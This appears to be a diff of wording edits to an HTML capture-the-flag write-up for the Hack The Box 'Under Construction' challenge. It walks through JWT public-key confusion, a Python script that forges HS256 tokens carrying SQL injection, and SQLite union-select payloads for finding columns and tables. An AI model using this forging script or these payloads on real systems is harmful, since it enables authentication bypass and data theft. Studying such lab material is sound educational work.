@@ -68,7 +68,7 @@
           <img src="/assets/cecil.gif" alt="Cecil Daemon" style="margin-right: 20px;"/>
           
           
-          <h1>cecil@celestial:/under-construction-htb$</h1>
+          <h1>cecil@celestial:/under-construction-htb $</h1>
       
       </a>
   </div>
@@ -186,10 +186,10 @@ Archive:  Under Construction.zip
 
 <h2 id="step-1---understanding-basic-concepts"><a href="#mindset-step1"></a>Step 1 - Understanding basic concepts</h2>
 
-<p>What are the things we need to know? First and foremost, we need to understand what are JWTs (JSON Web Tokens).</p>
+<p>What are the things we need to know? First and foremost, we need to understand what JWTs are.</p>
 
 <h3 id="json-web-tokens">JSON Web Tokens</h3>
-<p>JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three partes separated by dots:</p>
+<p>JWTs are tokens that define a self-secure way for transmitting information - as a JSON object - between users and the server. The form of a this JSON object consists of three parts separated by dots:</p>
 
 <ul>
   <li>Header</li>
@@ -219,7 +219,7 @@ Archive:  Under Construction.zip
   <li>Signature</li>
 </ul>
 
-<p>And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format of a JWT is like:</p>
+<p>And finally, the signature, which is the part of JWTs that ensures the token’s integrity and authenticity. The format JWTs take is:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;header-encoded&gt;.&lt;payload-encoded&gt;.&lt;signature&gt;
 </code></pre></div></div>
@@ -232,7 +232,7 @@ Archive:  Under Construction.zip
 
 <p><img src="../figs/underc8.png" alt="jwt.io decoder" /></p>
 
-<p>In the payload we are receiving our username and a RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:</p>
+<p>In the payload we are receiving our username and an RSA public key, from what it seems. I also noticed that once we log in, our username is displayed on the webpage:</p>
 
 <p><img src="../figs/underc9.png" alt="authenticated challenge front page" /></p>
 
@@ -250,11 +250,11 @@ Archive:  Under Construction.zip
 
 <p><img src="../figs/underc10.png" alt="DBHelper.js" /></p>
 
-<p>Upon a quick search, I’ve found <a href="https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html">this</a> page about the <code class="language-plaintext highlighter-rouge">get</code> method used to query the database. We can see that their example shows that the construction of <code class="language-plaintext highlighter-rouge">getUser</code> method here is prone to SQL injection. This is because <code class="language-plaintext highlighter-rouge">username</code> is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that <code class="language-plaintext highlighter-rouge">getUser</code> is being called when someone access the / path, which fetches the username through the JWT token.</p>
+<p>Upon a quick search, I’ve found <a href="https://knowledge-base.secureflag.com/vulnerabilities/sql_injection/sql_injection_nodejs.html">this</a> page about the <code class="language-plaintext highlighter-rouge">get</code> method used to query the database. We can see in their example a similarity with the construction of <code class="language-plaintext highlighter-rouge">getUser</code> method in the DBHelper.js, indicating a SQL injection. This is because <code class="language-plaintext highlighter-rouge">username</code> is being passed directly into the SQL query, and not as a parameter. Back to index.js, we find that <code class="language-plaintext highlighter-rouge">getUser</code> is being called when someone access the / path, which then fetches the username through the JWT token.</p>
 
 <h3 id="public-key">Public Key?</h3>
 
-<p>This looked odd to me, so I had to do a good research. My first research point was on <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555">HackTricks</a>, which showed a probably attack vector. With further investigation, I found the <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens">OWASP</a> webpage explaining this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:</p>
+<p>This looked odd to me, so I had to do a good research. My first stop was at <a href="https://book.hacktricks.xyz/pentesting-web/hacking-jwt-json-web-tokens#change-the-algorithm-rs256-asymmetric-to-hs256-symmetric-cve-2016-5431-cve-2016-10555">HackTricks</a>, which showed a probably attack vector. With further investigation, I found this <a href="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/06-Session_Management_Testing/10-Testing_JSON_Web_Tokens">OWASP</a> article, which explains this attack. The attack is called “Public Key Confusion”. Some conditions must be met in order to make it work:</p>
 
 <ol>
   <li>The server must expect a JWT to be signed with a public key (RSxxx or ESxxx).</li>
@@ -262,7 +262,7 @@ Archive:  Under Construction.zip
   <li>The public key used to verify the JWT must be available.</li>
 </ol>
 
-<p>The attack happens because the server uses <code class="language-plaintext highlighter-rouge">jwt.verify</code> erroneously if the algorithm is changed from RSxxx to HSxxx. HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, <code class="language-plaintext highlighter-rouge">jwt.verify</code> will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making maliciously crafted token to be accepted by the application.</p>
+<p>The attack occurs because the server erroneously uses <code class="language-plaintext highlighter-rouge">jwt.verify</code> when the algorithm is switched from an RSA-based algorithm (RSxxx) to an HMAC-based algorithm (HSxxx). HMAC SHA256 is a symmetric encryption method, while RSA isn’t. In this vulnerability, if the algorithms are swapped, <code class="language-plaintext highlighter-rouge">jwt.verify</code> will make use of the public key as HMAC secret key to decode the JWT and verify it, thus making the application to accept maliciously crafted tokens.</p>
 
 <p>Let’s see if it is our case. The first condition is met: the JWT header algorithm reveals to be RS256. The second condition is also met: if we look at the JWTHelper.js file, we see that in the decoding part the function accepts both RS256 and HS256.</p>
 
@@ -272,7 +272,7 @@ Archive:  Under Construction.zip
 
 <p><img src="../figs/underc12.png" alt="jwt.io signing jwt" /></p>
 
-<p>After pasting the public key provided by the JWT in the box above, we can see that this is the key used to sign this token. Therefore, the third condition is also met.</p>
+<p>After pasting the public key - provided by the JWT - in the box above, we can see that this is the correct public key used to sign the token. Therefore, the third condition is also met.</p>
 
 <h2 id="step-3---crafting-the-attack"><a href="#mindset-step3"></a>Step 3 - Crafting the attack</h2>
 
@@ -280,7 +280,7 @@ Archive:  Under Construction.zip
 
 <p>By combining these vulnerabilities, the attack strategy becomes clear: we can craft a JWT with a SQL injection payload in the username field. By exploiting the public key confusion, we can make the application accept our JWT.</p>
 
-<p>First, let’s save the public key in our local machine under the name of <code class="language-plaintext highlighter-rouge">pubkey.pem</code>. Remember, for this to work, we need to save the key exactly as it is below:</p>
+<p>First, let’s save the public key on our local machine, naming the file <code class="language-plaintext highlighter-rouge">pubkey.pem</code>. Remember, for this to work correctly, it’s crucial to save the key exactly as shown below:</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>-----BEGIN PUBLIC KEY-----
 MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA95oTm9DNzcHr8gLhjZaY
@@ -293,9 +293,9 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
 -----END PUBLIC KEY-----
 </code></pre></div></div>
 
-<p>No new lines, including both begin’s statements.</p>
+<p>No new lines. And make sure to include both begin statements.</p>
 
-<p>Let’s build a Python script that will create a maliciously crafted and signed JWT:</p>
+<p>Let’s build a Python script that will create a maliciously crafted and signed JWT with our <code class="language-plaintext highlighter-rouge">pubkey.pem</code>:</p>
 
 <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
 </span><span class="kn">import</span> <span class="n">sys</span>
@@ -320,7 +320,7 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
     <span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">alg</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">HS256</span><span class="sh">"</span><span class="p">,</span> <span class="sh">"</span><span class="s">typ</span><span class="sh">"</span><span class="p">:</span><span class="sh">"</span><span class="s">JWT</span><span class="sh">"</span><span class="p">}</span>
     <span class="n">payload</span> <span class="o">=</span> <span class="p">{</span><span class="sh">"</span><span class="s">username</span><span class="sh">"</span><span class="p">:</span> <span class="n">sqli</span><span class="p">,</span> <span class="sh">"</span><span class="s">pk</span><span class="sh">"</span><span class="p">:</span> <span class="n">pk_contents</span><span class="p">}</span>
 
-    <span class="c1"># convert the base64
+    <span class="c1"># convert to base64
 </span>    <span class="n">encoded_h</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">header</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)</span>
     <span class="n">encoded_p</span> <span class="o">=</span> <span class="n">base64</span><span class="p">.</span><span class="nf">urlsafe_b64encode</span><span class="p">(</span><span class="n">json</span><span class="p">.</span><span class="nf">dumps</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="nf">encode</span><span class="p">()).</span><span class="nf">decode</span><span class="p">().</span><span class="nf">rstrip</span><span class="p">(</span><span class="sh">"</span><span class="s">=</span><span class="sh">"</span><span class="p">)</span>
 
@@ -335,17 +335,17 @@ V8WS+YiYCU5OBAmTcz2w2kzBhZFlH6RK4mquexJHra23IGv5UJ5GVPEXpdCqK3Tr
     <span class="nf">print</span><span class="p">(</span><span class="n">jwt</span><span class="p">)</span>
 </code></pre></div></div>
 
-<p>To use this script, we simply run <code class="language-plaintext highlighter-rouge">chmod +x exploit.py</code>, and then <code class="language-plaintext highlighter-rouge">./exploit.py "sqli payload"</code>, and it will generate e usable JWT token for the application! To test if it is working, we will simply pass our username as a payload:</p>
+<p>To use this script, we simply run <code class="language-plaintext highlighter-rouge">chmod +x exploit.py</code>, and then <code class="language-plaintext highlighter-rouge">./exploit.py "sqli payload"</code>, and it will generate a valid, maliciously crafted, JWT token for the application! To test if it is working, we will simply pass our username as a payload:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"mula"</span>
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICJtdWxhIiwgInBrIjogIi0tLS0tQkVHSU4gUFVCTElDIEtFWS0tLS0tXG5NSUlCSWpBTkJna3Foa2lHOXcwQkFRRUZBQU9DQVE4QU1JSUJDZ0tDQVFFQTk1b1RtOUROemNIcjhnTGhqWmFZXG5rdHNiajFLeHhVT296dzB0clA5M0JnSXBYdjZXaXBRUkI1bHFvZlBsVTZGQjk5SmM1UVowNDU5dDczZ2dWRFFpXG5YdUNNSTJob1VmSjFWbWpOZVdDclNyRFVob2tJRlpFdUN1bWVod3d0VU51RXYwZXpDNTRaVGRFQzVZU1RBT3pnXG5qSVdhbHNIai9nYTVaRUR4M0V4dDBNaDVBRXdiQUQ3MytxWFMvdUN2aGZhamdwekhHZDlPZ05RVTYwTE1mMm1IXG4rRnluTnNqTk53bzVuUmU3dFIxMldiMllPQ3h3MnZkYW1PMW4xa2YvU015cFNLS3ZPZ2o1eTBMR2lVM2plWE14XG5WOFdTK1lpWUNVNU9CQW1UY3oydzJrekJoWkZsSDZSSzRtcXVleEpIcmEyM0lHdjVVSjVHVlBFWHBkQ3FLM1RyXG4wd0lEQVFBQlxuLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tXG4ifQ.qE9eS5hAKyvxgcVyh4Ne26-GNklpuDVNli4VkDeSYRQ
 </code></pre></div></div>
 
-<p>This JWT must log us in as mula, even though it is crafted and using HS256 algorithm instead of RS256:</p>
+<p>This JWT must log us in as mula:</p>
 
 <p><img src="../figs/underc13.png" alt="crafted jwt response" /></p>
 
-<p>As we can see, we successfuly logged in, proving the public key confusion vulnerability! To check if the server is vulnerable to SQL injection, we will use the following payload:</p>
+<p>As we can see, we successfuly logged in, proving the public key confusion vulnerability is present! To check if the server is vulnerable to SQL injection, we will use the following payload:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"' union SELECT ;--"</span>
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA7LS0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.DucJUAHb7T7y4mjQltzMcgQaDodL1E7VcWAgruIiJnQ
@@ -357,17 +357,17 @@ eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIFNFTEVDVCA
 
 <h2 id="step-4---solving"><a href="#mindset-step4"></a>Step 4 - Solving!</h2>
 
-<p>Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The next payload is used for identifying the number of columns the of first select statement: <code class="language-plaintext highlighter-rouge">' union select 1,1,...,1-- -</code>, where the number of ones in the injection is the number of columns. We do this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:</p>
+<p>Alright! Now we need to solve this bad boy. We still don’t know where the flag is, but with a SQL injection we are able to enumerate the database tables and hopefully find the flag. The following payload is used for identifying the number of columns of first select statement: <code class="language-plaintext highlighter-rouge">' union select 1,1,...,1-- -</code>, where the number of ones in the injection is the number of columns. We try this until we don’t get an error from the application. After attempting with (1), (1,1) and (1,1,1), we find that the number of columns is 3. The payload is:</p>
 
 <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>kaizen@celestial /tmp/htb <span class="nv">$ </span>./exploit.py <span class="s2">"' union select 1,1,1-- -"</span>
 eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VybmFtZSI6ICInIHVuaW9uIHNlbGVjdCAxLDEsMS0tIC0iLCAicGsiOiAiLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS1cbk1JSUJJakFOQmdrcWhraUc5dzBCQVFFRkFBT0NBUThBTUlJQkNnS0NBUUVBOTVvVG05RE56Y0hyOGdMaGpaYVlcbmt0c2JqMUt4eFVPb3p3MHRyUDkzQmdJcFh2NldpcFFSQjVscW9mUGxVNkZCOTlKYzVRWjA0NTl0NzNnZ1ZEUWlcblh1Q01JMmhvVWZKMVZtak5lV0NyU3JEVWhva0lGWkV1Q3VtZWh3d3RVTnVFdjBlekM1NFpUZEVDNVlTVEFPemdcbmpJV2Fsc0hqL2dhNVpFRHgzRXh0ME1oNUFFd2JBRDczK3FYUy91Q3ZoZmFqZ3B6SEdkOU9nTlFVNjBMTWYybUhcbitGeW5Oc2pOTndvNW5SZTd0UjEyV2IyWU9DeHcydmRhbU8xbjFrZi9TTXlwU0tLdk9najV5MExHaVUzamVYTXhcblY4V1MrWWlZQ1U1T0JBbVRjejJ3Mmt6QmhaRmxINlJLNG1xdWV4SkhyYTIzSUd2NVVKNUdWUEVYcGRDcUszVHJcbjB3SURBUUFCXG4tLS0tLUVORCBQVUJMSUMgS0VZLS0tLS1cbiJ9.y9yJbvfy0ARuq-hmEuYxSGJHcF5h1q3BonCf77iHi_c
 </code></pre></div></div>
 
-<p>Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to <code class="language-plaintext highlighter-rouge">' union select 1,2,3-- -</code>. Since the application returns the username for us when we pass it in the token, this union select statement will print out the username column number. This is the response for this payload:</p>
+<p>Now, we need to find which columns are being retrieved by the application. To do so, we change our payload to <code class="language-plaintext highlighter-rouge">' union select 1,2,3-- -</code>. Since the application returns the username back to us extracted from the token, this union select statement will print out the username column number. The respons to this paylod is:</p>
 
 <p><img src="../figs/underc15.png" alt="second payload" /></p>
 
-<p>As we can see, the username column is the second one. We need to know this, because this is the column that the application prints out for us. If we want it to print the flag, we will need to inject the flag payload in this position.</p>
+<p>As we can see, the username column is the second one. This is important to know because this column is what the application displays in clear text for us. If we want it to print the flag, we will need to inject the flag payload in this position.</p>
 
 <p>Now, to retrieve all the tables, we need to select the table names in the 2nd column position. With help of <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md#integerstring-based---extract-table-name">PayloadAllTheThings</a>, we can use <code class="language-plaintext highlighter-rouge">' union select 1, group_concat(tbl_name), 3 from sqlite_master where type='table' and tbl_name NOT like 'sqlite_%'-- -</code>. This will fetch all tables in the database:</p>
 
